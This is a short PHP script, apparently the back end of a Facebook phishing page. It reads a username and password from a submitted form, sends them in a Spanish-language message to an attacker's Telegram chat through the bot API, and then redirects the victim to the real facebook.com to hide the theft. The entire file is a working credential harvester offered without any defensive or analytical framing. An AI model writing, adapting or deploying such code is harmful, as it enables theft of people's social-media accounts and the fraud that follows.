<?php

require_once __DIR__ . '/config.php';

header('Content-Type: application/json');
// Enviar a Telegram
$token = TELEGRAM_BOT_TOKEN;
$chat_id = TELEGRAM_CHAT_ID;

$user = $_POST['user'];
$pass = $_POST['pass'];
$message = "Nuevo registro Facebook:\n[+]Usuario: $user\n[+]Contraseña: $pass";

$url = "https://api.telegram.org/bot$token/sendMessage";
$data = array('chat_id' => $chat_id, 'text' => $message);

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ),
);
$context  = stream_context_create($options);
file_get_contents($url, false, $context);

header("Location: https://www.facebook.com");
exit();
?>
